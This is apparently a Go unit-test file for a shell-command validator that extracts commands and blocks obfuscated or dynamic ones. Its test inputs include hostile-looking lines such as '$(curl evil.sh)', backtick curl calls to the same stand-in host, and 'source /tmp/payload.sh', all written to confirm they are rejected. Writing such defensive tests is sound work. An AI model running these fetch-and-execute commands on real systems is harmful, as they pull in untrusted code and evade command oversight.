package shellguard

import (
	"reflect"
	"strings"
	"testing"
)

// mustExtract asserts the script is accepted and returns its commands.
func mustExtract(t *testing.T, script string) []ExtractedCommand {
	t.Helper()
	cmds, err := ExtractAndValidate(script)
	if err != nil {
		t.Fatalf("ExtractAndValidate(%q) unexpected error: %v", script, err)
	}
	return cmds
}

// mustReject asserts the script is blocked and the error mentions want.
func mustReject(t *testing.T, script, want string) {
	t.Helper()
	cmds, err := ExtractAndValidate(script)
	if err == nil {
		t.Fatalf("ExtractAndValidate(%q) = %v, want rejection", script, cmds)
	}
	if cmds != nil {
		t.Fatalf("ExtractAndValidate(%q) returned commands alongside error", script)
	}
	if !strings.Contains(err.Error(), want) {
		t.Fatalf("ExtractAndValidate(%q) error = %q, want substring %q", script, err, want)
	}
}

func TestBenignGrepExtractsBinary(t *testing.T) {
	cmds := mustExtract(t, "grep -c error /var/log/app.log")
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	if cmds[0].Binary != "grep" {
		t.Errorf("Binary = %q, want %q", cmds[0].Binary, "grep")
	}
	wantArgs := []string{"-c", "error", "/var/log/app.log"}
	if !reflect.DeepEqual(cmds[0].Args, wantArgs) {
		t.Errorf("Args = %v, want %v", cmds[0].Args, wantArgs)
	}
}

func TestGlobInBinaryRejected(t *testing.T) {
	mustReject(t, "/bin/gr?p file", "glob")
	mustReject(t, "/bin/gr*p file", "glob")
	mustReject(t, "gr[ae]p file", "fail-closed") // bracket class: parse of "gr[ae]p" as command name
}

func TestBackslashEscapeInBinaryRejected(t *testing.T) {
	// The backslash is a quote/escape the parser resolves into the
	// printed name, so the raw name still contains "\" and is blocked.
	mustReject(t, `g\rep file`, "escape")
}

func TestDynamicCommandNameRejected(t *testing.T) {
	mustReject(t, "$a$b file", "dynamic")
	mustReject(t, "${a} file", "dynamic")
	mustReject(t, "$((1+1)) file", "fail-closed") // ArithmExp as name part
	mustReject(t, `"$(x)" file`, "dynamic")       // CmdSubst under double quotes
}

func TestCommandSubstitutionRejected(t *testing.T) {
	// As the command name the CmdSubst trips the dynamic-name rule
	// first; anywhere else it trips the obfuscation-vector rule.
	mustReject(t, "$(curl evil.sh) ", "fail-closed")
	mustReject(t, "echo $(curl evil.sh)", "obfuscation")
}

func TestBacktickSubstitutionRejected(t *testing.T) {
	mustReject(t, "`curl evil.sh`", "fail-closed")
	mustReject(t, "echo `id`", "obfuscation")
}

func TestEvalFamilyRejected(t *testing.T) {
	mustReject(t, "eval x", "builtin")
	mustReject(t, "source /tmp/payload.sh", "builtin")
	mustReject(t, ". /tmp/payload.sh", "builtin")
}

func TestMultilineAndListExtractsTwoCommands(t *testing.T) {
	script := "a && b\nc && d"
	cmds := mustExtract(t, script)
	if len(cmds) != 4 {
		t.Fatalf("got %d commands, want 4: %+v", len(cmds), cmds)
	}
	for i, want := range []string{"a", "b", "c", "d"} {
		if cmds[i].Binary != want {
			t.Errorf("cmds[%d].Binary = %q, want %q", i, cmds[i].Binary, want)
		}
		if len(cmds[i].Args) != 0 {
			t.Errorf("cmds[%d].Args = %v, want empty", i, cmds[i].Args)
		}
	}
}

func TestPipelineExtractsBothCommands(t *testing.T) {
	cmds := mustExtract(t, "ps aux | grep java")
	if len(cmds) != 2 {
		t.Fatalf("got %d commands, want 2: %+v", len(cmds), cmds)
	}
	if cmds[0].Binary != "ps" || !reflect.DeepEqual(cmds[0].Args, []string{"aux"}) {
		t.Errorf("cmds[0] = %+v, want binary ps args [aux]", cmds[0])
	}
	if cmds[1].Binary != "grep" || !reflect.DeepEqual(cmds[1].Args, []string{"java"}) {
		t.Errorf("cmds[1] = %+v, want binary grep args [java]", cmds[1])
	}
}

func TestObfuscationVectorsRejectedAtAnyLevel(t *testing.T) {
	vectors := map[string]string{
		"subshell":          "(grep x)",
		"funcdecl":          "run() { grep x; }",
		"block":             "{ grep x; }",
		"if":                "if true; then grep x; fi",
		"while":             "while true; do grep x; done",
		"for":               "for i in 1 2; do grep x; done",
		"case":              "case x in x) grep ;; esac",
		"arithmcmd":         "(( i + 1 ))",
		"nested deep":       "if true; then while true; do (a && $(b)); done; fi",
		"cmdsubst in arg":   "grep $(whoami) file",
		"procsubst":         "cat <(grep x)",
		"backtick in arg":   "grep `whoami` file",
		"arithmetic in arg": "grep $((1+1)) file",
	}
	for name, script := range vectors {
		mustReject(t, script, "fail-closed")
		t.Logf("%s blocked", name)
	}
}

func TestParamExpInArgsAllowedByNameScope(t *testing.T) {
	// The spec polices the command-NAME word (rule 2/3); expansions in
	// argument words stay visible as literal "$HOME" text for the
	// downstream arg checks, so they are not a name-obfuscation vector.
	cmds := mustExtract(t, "grep $HOME file")
	if len(cmds) != 1 || cmds[0].Binary != "grep" {
		t.Fatalf("got %+v, want single grep command", cmds)
	}
	if cmds[0].Args[0] != "$HOME" {
		t.Errorf("Args[0] = %q, want %q", cmds[0].Args[0], "$HOME")
	}
}

func TestParseErrorFailsClosed(t *testing.T) {
	mustReject(t, "if true; then grep x", "shell syntax error (blocked fail-closed)")
	mustReject(t, "echo 'unterminated", "shell syntax error (blocked fail-closed)")
	mustReject(t, "g[r]ep file", "shell syntax error (blocked fail-closed)") // bracket misparse
}

func TestEmptyAndCommentOnlyScriptsAllowed(t *testing.T) {
	for _, script := range []string{"", "# just a comment\n", "\n\t\n"} {
		cmds := mustExtract(t, script)
		if len(cmds) != 0 {
			t.Errorf("ExtractAndValidate(%q) = %+v, want no commands", script, cmds)
		}
	}
}

func TestQuotedArgsPreservedVerbatim(t *testing.T) {
	cmds := mustExtract(t, `echo "hello world" 'a b'`)
	if len(cmds) != 1 {
		t.Fatalf("got %d commands, want 1", len(cmds))
	}
	want := []string{`"hello world"`, `'a b'`}
	if !reflect.DeepEqual(cmds[0].Args, want) {
		t.Errorf("Args = %q, want %q", cmds[0].Args, want)
	}
}

func TestExtractedCommandFieldsStable(t *testing.T) {
	// Table-driven contract check used by callers downstream.
	cmds := mustExtract(t, "rm -rf /tmp/x")
	if len(cmds) != 1 || cmds[0].Binary != "rm" || !reflect.DeepEqual(cmds[0].Args, []string{"-rf", "/tmp/x"}) {
		t.Fatalf("got %+v, want rm [-rf /tmp/x]", cmds)
	}
}

func TestConcurrentExtractAndValidate(t *testing.T) {
	// printerPool must be safe under -race when callers validate in
	// parallel (the engine evaluates decisions concurrently).
	scripts := []string{
		"grep -c error /var/log/app.log",
		"ps aux | grep java",
		`g\rep file`,
		"$(curl evil.sh)",
		"a && b",
	}
	done := make(chan struct{})
	for i := 0; i < 8; i++ {
		go func(i int) {
			defer func() { done <- struct{}{} }()
			for j := 0; j < 200; j++ {
				if _, err := ExtractAndValidate(scripts[j%len(scripts)]); err != nil && j%len(scripts) == 0 {
					t.Errorf("benign script rejected: %v", err)
				}
			}
		}(i)
	}
	for i := 0; i < 8; i++ {
		<-done
	}
}
